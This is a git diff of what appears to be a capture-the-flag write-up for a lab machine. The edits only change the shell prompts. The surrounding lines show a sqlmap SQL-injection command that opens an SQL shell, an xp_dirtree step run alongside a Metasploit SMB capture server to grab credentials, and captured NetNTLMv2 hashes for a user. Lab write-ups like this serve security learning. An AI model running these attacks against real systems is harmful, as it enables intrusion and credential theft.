@@ -143,7 +143,7 @@ msf5 auxiliary(server/capture/smb) > run
 Then, open sql-shell with sqlmap and execute command "xp_dirtree".<br>
 
 {% highlight shell %}
-root@kali:/home/sabonawa# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 --sql-shell
+root@kali:~# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 --sql-shell
 
 ~~~
 
@@ -183,7 +183,7 @@ LM_CLIENT_CHALLENGE:
 At the same time, we can achieve john format password file in specified path.
 
 {% highlight shell %}
-sabonawa@kali:/root$ cat pw.txt_netntlmv2 
+root@kali:~# cat pw.txt_netntlmv2 
 Stacy::GIDDY:1122334455667788:61ae7af3ca2b17f741a536b66dbc5f47:01010000000000006b068f63f5cdd401e9d1374089ee722200000000020000000000000000000000
 Stacy::GIDDY:1122334455667788:823e63d2c40f8e7371451b6d427df435:0101000000000000ab809663f5cdd401fbb9f8a8f29f23cf00000000020000000000000000000000
 Stacy::GIDDY:1122334455667788:a6f46c56847372412f2f2efbdc91b3e4:0101000000000000add89d63f5cdd4014b711016199a5cae00000000020000000000000000000000
